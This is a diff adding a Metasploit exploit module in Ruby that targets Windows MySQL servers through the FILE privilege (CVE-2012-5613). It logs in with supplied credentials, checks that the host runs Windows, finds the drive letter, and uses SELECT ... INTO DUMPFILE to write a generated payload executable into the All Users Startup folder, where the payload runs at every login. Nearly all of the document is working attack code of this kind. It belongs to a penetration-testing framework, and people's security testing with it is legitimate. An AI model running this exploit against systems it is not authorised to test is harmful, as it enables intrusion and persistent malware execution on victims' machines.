@@ -1,0 +1,143 @@
+##
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::MYSQL
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Oracle MySQL for Microsoft Windows FILE Privilege Abuse',
+      'Description'    => %q{
+        This module takes advantage of a file privilege misconfiguration problem
+        specifically against Windows MySQL servers. This module abuses the FILE
+        privilege to write a payload to Microsoft's All Users Start Up directory
+        which will execute every time a user logs in. The default All Users Start
+        Up directory used by the module is Windows 7 friendly.
+      },
+      'Author'         =>
+        [
+          'sinn3r',
+          'Sean Verity <veritysr1980[at]gmail.com'
+        ],
+      'DefaultOptions' =>
+        {
+          'DisablePayloadHandler' =>  'true'
+        },
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2012-5613'], #DISPUTED
+          ['OSVDB', '88118'],
+          ['EDB', '23083'],
+          ['URL', 'http://seclists.org/fulldisclosure/2012/Dec/13']
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [ 'MySQL on Windows', { } ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Dec 01 2012'
+    ))
+
+    register_options(
+      [
+        OptString.new('USERNAME', [ true, 'The username to authenticate as']),
+        OptString.new('PASSWORD', [ true, 'The password to authenticate with']),
+        OptString.new('STARTUP_FOLDER', [ true, 'The All Users Start Up folder', '/programdata/microsoft/windows/start menu/programs/startup/'])
+      ])
+  end
+
+  def check
+    m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
+    return Exploit::CheckCode::Safe unless m
+
+    return Exploit::CheckCode::Appears if is_windows?
+
+    Exploit::CheckCode::Safe
+  end
+
+  def peer
+    "#{rhost}:#{rport}"
+  end
+
+  def query(q)
+    rows = []
+
+    begin
+      res = mysql_query(q)
+      return rows unless res
+      res.each_hash do |row|
+        rows << row
+      end
+    rescue RbMysql::ParseError
+      return rows
+    end
+
+    rows
+  end
+
+  def is_windows?
+    r = query("SELECT @@version_compile_os;")
+    r[0]['@@version_compile_os'] =~ /^Win/ ? true : false
+  end
+
+  def get_drive_letter
+    r = query("SELECT @@tmpdir;")
+    drive = r[0]['@@tmpdir'].scan(/^(\w):/).flatten[0] || ''
+
+    drive
+  end
+
+  def upload_file(bin, dest)
+    p = bin.unpack("H*")[0]
+    query("SELECT 0x#{p} into DUMPFILE '#{dest}'")
+  end
+
+  def exploit
+    unless datastore['STARTUP_FOLDER'].start_with?('/') && datastore['STARTUP_FOLDER'].end_with?('/')
+      fail_with(Failure::BadConfig, "STARTUP_FOLDER should start and end with '/' Ex: /programdata/microsoft/windows/start menu/programs/startup/")
+    end
+
+    print_status("#{peer} - Attempting to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'")
+    begin
+      m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
+    rescue RbMysql::AccessDeniedError
+      fail_with(Failure::NoAccess, "#{peer} - Access denied")
+    end
+
+    fail_with(Failure::NoAccess, "#{peer} - Unable to Login") unless m
+
+    unless is_windows?
+      fail_with(Failure::NoTarget, "#{peer} - Remote host isn't Windows")
+    end
+
+    begin
+      drive = get_drive_letter
+    rescue RbMysql::ParseError
+      fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine drive name")
+    end
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine drive name") unless drive
+
+    exe_name = Rex::Text::rand_text_alpha(5) + ".exe"
+    dest     = "#{drive}:#{datastore['STARTUP_FOLDER']}#{exe_name}"
+    exe      = generate_payload_exe
+
+    print_status("#{peer} - Uploading to '#{dest}'")
+    begin
+      upload_file(exe, dest)
+    rescue RbMysql::AccessDeniedError
+      fail_with(Failure::NotVulnerable, "#{peer} - No permission to write. I blame kc :-)")
+    end
+    register_file_for_cleanup("#{dest}")
+  end
+
+end
